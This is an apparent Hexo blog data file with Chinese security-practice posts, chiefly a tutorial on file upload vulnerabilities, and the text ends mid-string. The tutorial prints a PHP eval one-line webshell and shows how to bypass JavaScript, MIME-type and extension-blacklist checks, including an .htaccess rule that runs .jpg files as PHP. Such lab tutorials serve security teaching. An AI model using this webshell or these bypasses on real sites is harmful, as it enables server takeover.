src=\"https://img-blog.csdnimg.cn/20200710124834510.png\" alt=\"在这里插入图片描述\"><br>隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。<br><img src=\"https://img-blog.csdnimg.cn/20200710125007998.png\" alt=\"在这里插入图片描述\"><br>红绿蓝的0通道最上面都被遮住了，应该会有一些东西。<br>用data extract 钩住红绿蓝的0通道。<br><img src=\"https://img-blog.csdnimg.cn/20200710125224165.png\" alt=\"在这里插入图片描述\"><br>保存为png的图片，会得到一张二维码，扫一下的到flag。</p>\n"},{"title":"博客美化","date":"2020-03-03T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp"],"_content":"\n\n\n﻿想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。\n给大家分享一下：\n\n1. 在歌单页面，在“生成外链播放器”上右击，点击 **检查** 这一项。\n2. 找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030311053249.png)\n3. 将链接修改成这样 [http://music.163.com/#/outchain/2/1424766691/](http://music.163.com/#/outchain/2/1424766691/)，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。\n","source":"_posts/博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）.md","raw":"---\ntitle: 博客美化\ndate: 2020-03-03 15:04:05\ntags: 其他\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp\n---\n\n\n\n﻿想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。\n给大家分享一下：\n\n1. 在歌单页面，在“生成外链播放器”上右击，点击 **检查** 这一项。\n2. 找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030311053249.png)\n3. 将链接修改成这样 [http://music.163.com/#/outchain/2/1424766691/](http://music.163.com/#/outchain/2/1424766691/)，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。\n","slug":"博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）","published":1,"updated":"2020-05-11T09:35:40.772Z","comments":1,"layout":"post","link":"","_id":"ckchhpshd001b9kq6ff1g9fxd","content":"<p>﻿想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。<br>给大家分享一下：</p>\n<ol>\n<li>在歌单页面，在“生成外链播放器”上右击，点击 <strong>检查</strong> 这一项。</li>\n<li>找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来<br><img src=\"https://img-blog.csdnimg.cn/2020030311053249.png\" alt=\"在这里插入图片描述\"></li>\n<li>将链接修改成这样 <a href=\"http://music.163.com/#/outchain/2/1424766691/\" target=\"_blank\" rel=\"noopener\">http://music.163.com/#/outchain/2/1424766691/</a>，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。<br>给大家分享一下：</p>\n<ol>\n<li>在歌单页面，在“生成外链播放器”上右击，点击 <strong>检查</strong> 这一项。</li>\n<li>找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来<br><img src=\"https://img-blog.csdnimg.cn/2020030311053249.png\" alt=\"在这里插入图片描述\"></li>\n<li>将链接修改成这样 <a href=\"http://music.163.com/#/outchain/2/1424766691/\" target=\"_blank\" rel=\"noopener\">http://music.163.com/#/outchain/2/1424766691/</a>，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。</li>\n</ol>\n"},{"title":"暑假第一周练习(二)文件上传漏洞(一)","date":"2020-07-11T06:35:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp"],"_content":"\n\n\n﻿# 文件上传漏洞\n\n### 目录：                                                                                              0×01 任意文件上传\t\t\t\t\t\t\t\t\t\t\t\t   \t\t\t        0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制\n**文件上传漏洞原理**：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。\n当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。\n\n**0×01 任意文件上传**\n\n没有任何条件限制，可上传任意文件。\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710180315201.png)\n直接上传我们的PHP一句话木马\n\n```\n<?php @eval($_POST['qidian']);  ?>\n```\n上传之后，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710180711593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n显示出了文件所在的路径，类型等等。\n\n上传成功代表着我们可以通过webshell访问网站\n\n输入一些命令我们就可以查看网站的一些内容，例如\n查看网站PHP的版本信息：\n\n```\nqidian=phpinfo();\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710181517345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n可以通过webshell用不同的命令，得到网站的各种信息。\n当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071018212471.png)\n上图使用蚁剑连接的，对我们webshell上传目录可视化。\n\n**0×02 JS限制**\n\n所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。\n\n```\n<script type=\"text/javascript\">\n        function checkFile() {\n            var file = document.getElementsByName('upfile')[0].value;\n            if (file == null || file == \"\") {\n                alert(\"你还没有选择任何文件，不能上传!\");\n                return false;\n            }\n            //定义允许上传的文件类型\n            var allow_ext = \".jpg|.jpeg|.png|.gif|.bmp|\";\n            //提取上传文件的类型\n            var ext_name = file.substring(file.lastIndexOf(\".\"));\n            //alert(ext_name);\n            //alert(ext_name + \"|\");\n            //判断上传文件类型是否允许上传\n            if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n                var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n                alert(errMsg);\n                return false;\n            }\n        }\n    </script>\n```\n上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710190107952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了\n\n绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。\n\n我们也可以用BurpSuite抓包，改包进行绕过。\n\n**0×03  MIME限制**\n\nMIME限制就是文件类型限制。\n\n```\nif (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n```\n从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。\n常见的：超文本标记语言文本 .html,html text/htm\n              普通文本   .txt text/plain\n              RTF文本. rtf application/rtf\n             GIF图形 .gif image/gif\n             JPEG图形 . jpg image/jpeg\n             PHP文件  .php  application/octet-stream\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710195335306.png)\n类型不对，无法上传。\n\n当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。\n\n因此，我们需要通过抓包改包改变MIME 内容。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710200640718.png)\n将Content-Type的内容改为  image/jpeg   就可以绕过MIME限制。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710200816632.png)\n\n**0×04 黑名单限制**\n\n文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200711130510847.png)\n上面就是黑名单里限制的格式。\n\n我们可以将文件后缀改为  phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。\n也可以用后缀加点，加空格，点 +空格+点 绕过等等。\n\n*今天用重写文件解析绕过。(  .htaccess文件)*\n\n.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\nhtaccess文件内容为：`SetHandler application/x-httpd-php`\n\n```\n<FilesMatch \"jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n即我们上传任何格式的文件都会被当作php文件执行。\n\n先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。\n\n\n\n","source":"_posts/暑假第一周练习(二)文件上传漏洞(一).md","raw":"---\ntitle: 暑假第一周练习(二)文件上传漏洞(一)\ndate: 2020-07-11 14:35:05\ntags: 练习\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp\n---\n\n\n\n﻿# 文件上传漏洞\n\n### 目录：                                                                                              0×01 任意文件上传\t\t\t\t\t\t\t\t\t\t\t\t   \t\t\t        0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制\n**文件上传漏洞原理**：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。\n当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。\n\n**0×01 任意文件上传**\n\n没有任何条件限制，可上传任意文件。\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710180315201.png)\n直接上传我们的PHP一句话木马\n\n```\n<?php @eval($_POST['qidian']);  ?>\n```\n上传之后，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710180711593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n显示出了文件所在的路径，类型等等。\n\n上传成功代表着我们可以通过webshell访问网站\n\n输入一些命令我们就可以查看网站的一些内容，例如\n查看网站PHP的版本信息：\n\n```\nqidian=phpinfo();\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710181517345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n可以通过webshell用不同的命令，得到网站的各种信息。\n当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071018212471.png)\n上图使用蚁剑连接的，对我们webshell上传目录可视化。\n\n**0×02 JS限制**\n\n所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。\n\n```\n<script type=\"text/javascript\">\n        function checkFile() {\n            var file = document.getElementsByName('upfile')[0].value;\n            if (file == null || file == \"\") {\n                alert(\"你还没有选择任何文件，不能上传!\");\n                return false;\n            }\n            //定义允许上传的文件类型\n            var allow_ext = \".jpg|.jpeg|.png|.gif|.bmp|\";\n            //提取上传文件的类型\n            var ext_name = file.substring(file.lastIndexOf(\".\"));\n            //alert(ext_name);\n            //alert(ext_name + \"|\");\n            //判断上传文件类型是否允许上传\n            if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n                var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n                alert(errMsg);\n                return false;\n            }\n        }\n    </script>\n```\n上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710190107952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了\n\n绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。\n\n我们也可以用BurpSuite抓包，改包进行绕过。\n\n**0×03  MIME限制**\n\nMIME限制就是文件类型限制。\n\n```\nif (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n```\n从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。\n常见的：超文本标记语言文本 .html,html text/htm\n              普通文本   .txt text/plain\n              RTF文本. rtf application/rtf\n             GIF图形 .gif image/gif\n             JPEG图形 . jpg image/jpeg\n             PHP文件  .php  application/octet-stream\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710195335306.png)\n类型不对，无法上传。\n\n当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。\n\n因此，我们需要通过抓包改包改变MIME 内容。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710200640718.png)\n将Content-Type的内容改为  image/jpeg   就可以绕过MIME限制。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200710200816632.png)\n\n**0×04 黑名单限制**\n\n文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200711130510847.png)\n上面就是黑名单里限制的格式。\n\n我们可以将文件后缀改为  phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。\n也可以用后缀加点，加空格，点 +空格+点 绕过等等。\n\n*今天用重写文件解析绕过。(  .htaccess文件)*\n\n.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\nhtaccess文件内容为：`SetHandler application/x-httpd-php`\n\n```\n<FilesMatch \"jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n即我们上传任何格式的文件都会被当作php文件执行。\n\n先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。\n\n\n\n","slug":"暑假第一周练习(二)文件上传漏洞(一)","published":1,"updated":"2020-07-11T09:26:03.613Z","comments":1,"layout":"post","link":"","_id":"ckchhpshf001e9kq6eo7re1qc","content":"<p>﻿# 文件上传漏洞</p>\n<h3 id=\"目录：-0×01-任意文件上传-0×02-JS限制-0×03-MIME限制-0×04-黑名单限制\"><a href=\"#目录：-0×01-任意文件上传-0×02-JS限制-0×03-MIME限制-0×04-黑名单限制\" class=\"headerlink\" title=\"目录：                                                                                              0×01 任意文件上传                                                                       0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制\"></a>目录：                                                                                              0×01 任意文件上传                                                                       0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制</h3><p><strong>文件上传漏洞原理</strong>：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。<br>当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。</p>\n<p><strong>0×01 任意文件上传</strong></p>\n<p>没有任何条件限制，可上传任意文件。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710180315201.png\" alt=\"在这里插入图片描述\"><br>直接上传我们的PHP一句话木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[&#39;qidian&#39;]);  ?&gt;</span><br></pre></td></tr></table></figure>\n<p>上传之后，<br><img src=\"https://img-blog.csdnimg.cn/20200710180711593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>显示出了文件所在的路径，类型等等。</p>\n<p>上传成功代表着我们可以通过webshell访问网站</p>\n<p>输入一些命令我们就可以查看网站的一些内容，例如<br>查看网站PHP的版本信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qidian&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710181517345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以通过webshell用不同的命令，得到网站的各种信息。<br>当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。<br><img src=\"https://img-blog.csdnimg.cn/2020071018212471.png\" alt=\"在这里插入图片描述\"><br>上图使用蚁剑连接的，对我们webshell上传目录可视化。</p>\n<p><strong>0×02 JS限制</strong></p>\n<p>所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class=\"line\">        function checkFile() &#123;</span><br><span class=\"line\">            var file &#x3D; document.getElementsByName(&#39;upfile&#39;)[0].value;</span><br><span class=\"line\">            if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class=\"line\">                alert(&quot;你还没有选择任何文件，不能上传!&quot;);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class=\"line\">            var allow_ext &#x3D; &quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;;</span><br><span class=\"line\">            &#x2F;&#x2F;提取上传文件的类型</span><br><span class=\"line\">            var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">            &#x2F;&#x2F;alert(ext_name);</span><br><span class=\"line\">            &#x2F;&#x2F;alert(ext_name + &quot;|&quot;);</span><br><span class=\"line\">            &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class=\"line\">            if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class=\"line\">                var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">                alert(errMsg);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。<br><img src=\"https://img-blog.csdnimg.cn/20200710190107952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了</p>\n<p>绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。</p>\n<p>我们也可以用BurpSuite抓包，改包进行绕过。</p>\n<p><strong>0×03  MIME限制</strong></p>\n<p>MIME限制就是文件类型限制。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class=\"line\">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br></pre></td></tr></table></figure>\n<p>从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。<br>常见的：超文本标记语言文本 .html,html text/htm<br>              普通文本   .txt text/plain<br>              RTF文本. rtf application/rtf<br>             GIF图形 .gif image/gif<br>             JPEG图形 . jpg image/jpeg<br>             PHP文件  .php  application/octet-stream<br><img src=\"https://img-blog.csdnimg.cn/20200710195335306.png\" alt=\"在这里插入图片描述\"><br>类型不对，无法上传。</p>\n<p>当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。</p>\n<p>因此，我们需要通过抓包改包改变MIME 内容。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710200640718.png\" alt=\"在这里插入图片描述\"><br>将Content-Type的内容改为  image/jpeg   就可以绕过MIME限制。<br><img src=\"https://img-blog.csdnimg.cn/20200710200816632.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>0×04 黑名单限制</strong></p>\n<p>文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。<br><img src=\"https://img-blog.csdnimg.cn/20200711130510847.png\" alt=\"在这里插入图片描述\"><br>上面就是黑名单里限制的格式。</p>\n<p>我们可以将文件后缀改为  phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。<br>也可以用后缀加点，加空格，点 +空格+点 绕过等等。</p>\n<p><em>今天用重写文件解析绕过。(  .htaccess文件)</em></p>\n<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n<p>htaccess文件内容为：<code>SetHandler application/x-httpd-php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class=\"line\">SetHandler application&#x2F;x-httpd-php</span><br><span class=\"line\">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>即我们上传任何格式的文件都会被当作php文件执行。</p>\n<p>先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿# 文件上传漏洞</p>\n<h3 id=\"目录：-0×01-任意文件上传-0×02-JS限制-0×03-MIME限制-0×04-黑名单限制\"><a href=\"#目录：-0×01-任意文件上传-0×02-JS限制-0×03-MIME限制-0×04-黑名单限制\" class=\"headerlink\" title=\"目录：                                                                                              0×01 任意文件上传                                                                       0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制\"></a>目录：                                                                                              0×01 任意文件上传                                                                       0×02 JS限制                                                                                     0×03  MIME限制                                                                           0×04 黑名单限制</h3><p><strong>文件上传漏洞原理</strong>：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。<br>当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。</p>\n<p><strong>0×01 任意文件上传</strong></p>\n<p>没有任何条件限制，可上传任意文件。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710180315201.png\" alt=\"在这里插入图片描述\"><br>直接上传我们的PHP一句话木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[&#39;qidian&#39;]);  ?&gt;</span><br></pre></td></tr></table></figure>\n<p>上传之后，<br><img src=\"https://img-blog.csdnimg.cn/20200710180711593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>显示出了文件所在的路径，类型等等。</p>\n<p>上传成功代表着我们可以通过webshell访问网站</p>\n<p>输入一些命令我们就可以查看网站的一些内容，例如<br>查看网站PHP的版本信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qidian&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710181517345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以通过webshell用不同的命令，得到网站的各种信息。<br>当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。<br><img src=\"https://img-blog.csdnimg.cn/2020071018212471.png\" alt=\"在这里插入图片描述\"><br>上图使用蚁剑连接的，对我们webshell上传目录可视化。</p>\n<p><strong>0×02 JS限制</strong></p>\n<p>所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class=\"line\">        function checkFile() &#123;</span><br><span class=\"line\">            var file &#x3D; document.getElementsByName(&#39;upfile&#39;)[0].value;</span><br><span class=\"line\">            if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class=\"line\">                alert(&quot;你还没有选择任何文件，不能上传!&quot;);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class=\"line\">            var allow_ext &#x3D; &quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;;</span><br><span class=\"line\">            &#x2F;&#x2F;提取上传文件的类型</span><br><span class=\"line\">            var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">            &#x2F;&#x2F;alert(ext_name);</span><br><span class=\"line\">            &#x2F;&#x2F;alert(ext_name + 